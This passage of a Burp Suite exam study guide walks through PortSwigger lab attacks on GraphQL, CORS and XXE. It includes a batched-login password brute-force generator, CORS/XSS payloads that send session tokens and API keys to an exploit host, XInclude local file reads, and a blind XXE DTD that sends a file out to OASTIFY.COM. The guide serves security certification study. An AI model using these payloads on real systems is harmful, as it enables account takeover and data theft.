<p dir="auto"><a href="https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure" rel="nofollow">PortSwigger Lab: Accidental exposure of private GraphQL fields</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">GraphQL Brute Force</h3><a id="user-content-graphql-brute-force" class="anchor" aria-label="Permalink: GraphQL Brute Force" href="#graphql-brute-force"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The login API is protected by rate limiter to protect against brute force attacks.<br>
Sending too many incorrect login attempts to the API, rate limit protection response message response is <em><strong>identified</strong></em>.</p>
</blockquote>
<div class="highlight highlight-source-graphql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{  &quot;errors&quot;: [
    {
      &quot;path&quot;: [
        &quot;login&quot;
      ],
      &quot;extensions&quot;: {
        &quot;message&quot;: &quot;You have made too many incorrect login attempts. Please try again in 1 minute(s).&quot;
      },
      &quot;locations&quot;: [
        {
          &quot;line&quot;: 3,
          &quot;column&quot;: 9
        }
      ],
      &quot;message&quot;: &quot;Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s).&quot;
    }
  ],
  &quot;data&quot;: {
    &quot;login&quot;: null
  } }"><pre>{  <span class="pl-c">"errors"</span>: [
    {
      <span class="pl-c">"path"</span>: [
        <span class="pl-c">"login"</span>
      ],
      <span class="pl-c">"extensions"</span>: {
        <span class="pl-c">"message"</span>: <span class="pl-c">"You have made too many incorrect login attempts. Please try again in 1 minute(s)."</span>
      },
      <span class="pl-c">"locations"</span>: [
        {
          <span class="pl-c">"line"</span>: 3,
          <span class="pl-c">"column"</span>: 9
        }
      ],
      <span class="pl-c">"message"</span>: <span class="pl-c">"Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s)."</span>
    }
  ],
  <span class="pl-c">"data"</span>: {
    <span class="pl-c">"login"</span>: <span class="pl-v">null</span>
  } }</pre></div>
<blockquote>
<p dir="auto">Using the following PortSwigger JavaScript to generate a list of login combination with <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" rel="nofollow">password wordlist</a> as part of brute force attack that bypass rate limiting protection.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=&gt;`
bruteforce$index:login(input:{password: &quot;$password&quot;, username: &quot;carlos&quot;}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log(&quot;The query has been copied to your clipboard.&quot;);"><pre><span class="pl-en">copy</span><span class="pl-kos">(</span><span class="pl-s">`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`</span><span class="pl-kos">.</span><span class="pl-en">split</span><span class="pl-kos">(</span><span class="pl-s">','</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-en">map</span><span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-s1">element</span><span class="pl-kos">,</span><span class="pl-s1">index</span><span class="pl-kos">)</span><span class="pl-c1">=&gt;</span><span class="pl-s">`</span>
<span class="pl-s">bruteforce$index:login(input:{password: "$password", username: "carlos"}) {</span>
<span class="pl-s">        token</span>
<span class="pl-s">        success</span>
<span class="pl-s">    }</span>
<span class="pl-s">`</span><span class="pl-kos">.</span><span class="pl-en">replaceAll</span><span class="pl-kos">(</span><span class="pl-s">'$index'</span><span class="pl-kos">,</span><span class="pl-s1">index</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-en">replaceAll</span><span class="pl-kos">(</span><span class="pl-s">'$password'</span><span class="pl-kos">,</span><span class="pl-s1">element</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-en">join</span><span class="pl-kos">(</span><span class="pl-s">'\n'</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">;</span><span class="pl-smi">console</span><span class="pl-kos">.</span><span class="pl-en">log</span><span class="pl-kos">(</span><span class="pl-s">"The query has been copied to your clipboard."</span><span class="pl-kos">)</span><span class="pl-kos">;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-brute-list.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-brute-list.png" alt="graphql-brute-list.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Using the output from the above JavaScript, and place it in the InQL tab of the login POST request <code>POST /graphql/v1 HTTP/2</code>, removing the <code>operationName</code> POST body parameter and value, before sending single request containing all possible passwords in the GraphQL query.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-brute-force-InQL.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-brute-force-InQL.png" alt="graphql-brute-force-InQL.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Response from the single POST request is one value marked <code>true</code> and the client login token return in response.</p>
</blockquote>
<blockquote>
<p dir="auto">Replace the cookie in browser to impersonate Carlos user session.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass" rel="nofollow">PortSwigger Lab: Bypassing GraphQL brute force protections</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">GraphQL Voyager</h3><a id="user-content-graphql-voyager" class="anchor" aria-label="Permalink: GraphQL Voyager" href="#graphql-voyager"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Using GraphQL Voyager to visually find attack paths, sensitive functions, types, objects and data.</p>
</blockquote>
<blockquote>
<p dir="auto">Run Introspection query and copy response body to file <code>introspection.json</code>
Host local GraphQL Voyager on Kali Linux:</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="mkdir graphql-voyager-local
cp ../introspection.json graphql-voyager-local/
sudo apt install nodejs npm
npm install express graphql-voyager
node server.js"><pre class="notranslate"><code>mkdir graphql-voyager-local
cp ../introspection.json graphql-voyager-local/
sudo apt install nodejs npm
npm install express graphql-voyager
node server.js
</code></pre></div>
<blockquote>
<p dir="auto">See code for the server.js in repo files.</p>
</blockquote>
<blockquote>
<p dir="auto">Browse to GraphQL voyager instance <code>http://localhost:3001/voyager</code></p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql.png" alt="GraphQL Voyager" style="max-width: 100%;"></a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">CORS</h2><a id="user-content-cors" class="anchor" aria-label="Permalink: CORS" href="#cors"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#trusted-insecure-protocols">Trusted insecure protocols</a><br>
<a href="#null-origin-trusted">Null origin trusted</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Trusted insecure protocols</h3><a id="user-content-trusted-insecure-protocols" class="anchor" aria-label="Permalink: Trusted insecure protocols" href="#trusted-insecure-protocols"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> in the <code>source code</code> the account details are requested with AJAX request and it contains the user session cookie in the response.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cors-ajax-request.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cors-ajax-request.png" alt="cors-ajax-request.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Test if the application CORS configuration will allow access to sub-domains using below test header. If response include the <code>Access-Control-Allow-Origin</code> header with the origin reflect it is vulnerable to <strong>CORS</strong>.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="Origin: http://subdomain.TARGET.NET"><pre class="notranslate"><code>Origin: http://subdomain.TARGET.NET
</code></pre></div>
<blockquote>
<p dir="auto">The target call subdomain to retrieve stock values, and the <code>productid</code> parameter is vulnerable to cross-site scripting (XSS).</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/subdomain-cors-xss.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/subdomain-cors-xss.png" alt="Subdomain cors xss" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Place code in the exploit server body and <strong>Deliver exploit to victim</strong> to steal the AJAX session token and API key. In the BSCP exam use the <a href="#cors">CORS</a> vulnerability to steal JSON data that also include the administrator session token, and can be used to escalate privilege.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
    document.location=&quot;http://stock.TARGET.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1&quot;
&lt;/script&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
    <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-c1">=</span><span class="pl-s">"http://stock.TARGET.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/cors/lab-breaking-https-attack" rel="nofollow">PortSwigger Lab: CORS vulnerability with trusted insecure protocols</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Null origin trusted</h3><a id="user-content-null-origin-trusted" class="anchor" aria-label="Permalink: Null origin trusted" href="#null-origin-trusted"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Identify the CORS insecure configuration by checking the AJAX response if it contains the <code>Access-Control-Allow-Credentials</code>, then add header <code>Origin: null</code>. If the <code>null</code> origin is reflected in the <code>Access-Control-Allow-Origin</code> header it is vulnerable.</p>
</blockquote>
<blockquote>
<p dir="auto">Payload that may work in BSCP exam to obtain the administrator account API and session cookie data. Host on exploit server.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">iframe</span> <span class="pl-c1">sandbox</span>="<span class="pl-s">allow-scripts allow-top-navigation allow-forms</span>" <span class="pl-c1">srcdoc</span>="<span class="pl-s">&lt;script&gt;</span>
<span class="pl-s">    var req = new XMLHttpRequest();</span>
<span class="pl-s">    req.onload = reqListener;</span>
<span class="pl-s">    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);</span>
<span class="pl-s">    req.withCredentials = true;</span>
<span class="pl-s">    req.send();</span>
<span class="pl-s">    function reqListener() {</span>
<span class="pl-s">        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);</span>
<span class="pl-s">    };</span>
<span class="pl-s">&lt;/script&gt;</span>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">iframe</span><span class="pl-kos">&gt;</span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/CORS-NULL.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/CORS-NULL.png" alt="CORS-NULL trusted" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack" rel="nofollow">PortSwigger Lab: CORS vulnerability with trusted null origin</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Data Exfiltration</h1><a id="user-content-data-exfiltration" class="anchor" aria-label="Permalink: Data Exfiltration" href="#data-exfiltration"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">XXE Injections</h2><a id="user-content-xxe-injections" class="anchor" aria-label="Permalink: XXE Injections" href="#xxe-injections"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#identify-xml">XXE Identify</a><br>
<a href="#xinclude-file-read">XXE Xinclude file read</a><br>
<a href="#dtd-blind-out-of-band">XXE DTD Blind Out-of-band</a><br>
<a href="#dtd-blind-error-messages">XXE DTD Blind Error messages</a><br>
<a href="#sql--xml--hackvertor">XXE SQLi inside XML + HackVertor</a><br>
<a href="#xxe--ssrf">XXE perform SSRF</a><br>
<a href="#xxe-via-svg-image-upload">XXE with SVG upload</a><br>
<a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/Web-Attacks.md#xxe">HackTheBox XML External Entity Injection - Private Github</a></p>
<blockquote>
<p dir="auto">File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Identify XML</h3><a id="user-content-identify-xml" class="anchor" aria-label="Permalink: Identify XML" href="#identify-xml"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Possible to find XXE attack surface in requests that do not contain any XML.</p>
</blockquote>
<blockquote>
<p dir="auto">To <em><strong>Identify</strong></em> XXE in not so obvious parameters or requests, require adding the below and URL encode the <strong>&amp;</strong> ampersand symbol to see the response.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="%26entity;"><pre>%26entity;</pre></div>
<blockquote>
<p dir="auto">Below the server respond with indication that XML Entities are not allowed for security reasons.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-xxe.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-xxe.png" alt="Identify XML Injections" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Xinclude file read</h3><a id="user-content-xinclude-file-read" class="anchor" aria-label="Permalink: Xinclude file read" href="#xinclude-file-read"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Webapp <strong>Check Stock</strong> feature use server-side XML document that is server side parsed inside XML document, and request is not constructed of the entire XML document, it is not possible to use a hosted DTD file. Injecting an <strong>XInclude</strong> statement to retrieve the contents of <code>/home/carlos/secret</code> file instead.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///home/carlos/secret&quot;/&gt;&lt;/foo&gt;"><pre>&lt;<span class="pl-ent">foo</span> <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">xi</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2001/XInclude<span class="pl-pds">"</span></span>&gt;&lt;<span class="pl-ent">xi</span><span class="pl-ent">:</span><span class="pl-ent">include</span> <span class="pl-e">parse</span>=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> <span class="pl-e">href</span>=<span class="pl-s"><span class="pl-pds">"</span>file:///home/carlos/secret<span class="pl-pds">"</span></span>/&gt;&lt;/<span class="pl-ent">foo</span>&gt;</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xinclude.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xinclude.png" alt="XInclude to retrieve files" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">URL encode the XXE payload before sending.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;foo+xmlns%3axi%3d&quot;http%3a//www.w3.org/2001/XInclude&quot;&gt;&lt;xi%3ainclude+parse%3d&quot;text&quot;+href%3d&quot;file%3a///etc/hostname&quot;/&gt;&lt;/foo&gt;"><pre>&lt;<span class="pl-ent">foo</span>+xmlns%3axi%3d<span class="pl-s"><span class="pl-pds">"</span>http%3a//www.w3.org/2001/XInclude<span class="pl-pds">"</span></span>&gt;&lt;<span class="pl-ent">xi</span>%3ainclude+parse%3d<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>+href%3d<span class="pl-s"><span class="pl-pds">"</span>file%3a///etc/hostname<span class="pl-pds">"</span></span>/&gt;&lt;/<span class="pl-ent">foo</span>&gt;</pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" rel="nofollow">PortSwigger Lab: Exploiting XInclude to retrieve files</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">DTD Blind Out-of-band</h3><a id="user-content-dtd-blind-out-of-band" class="anchor" aria-label="Permalink: DTD Blind Out-of-band" href="#dtd-blind-out-of-band"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">On the exploit server change the hosted file name to <code>/exploit.dtd</code> as the exploit file with <strong>Document Type Definition (DTD)</strong> extension, containing the following payload. The <code>&amp;#x25;</code> is the Unicode hex character code for percent sign <code>%</code>. <strong><a href="https://academy.hackthebox.com/module/134/section/1206" rel="nofollow">Parameter entities</a></strong> are referenced using the <strong>percent</strong> character instead of the usual ampersand.</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;!ENTITY % file SYSTEM &quot;file:///home/carlos/secret&quot;&gt;
&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'&gt;&quot;&gt;
%eval;
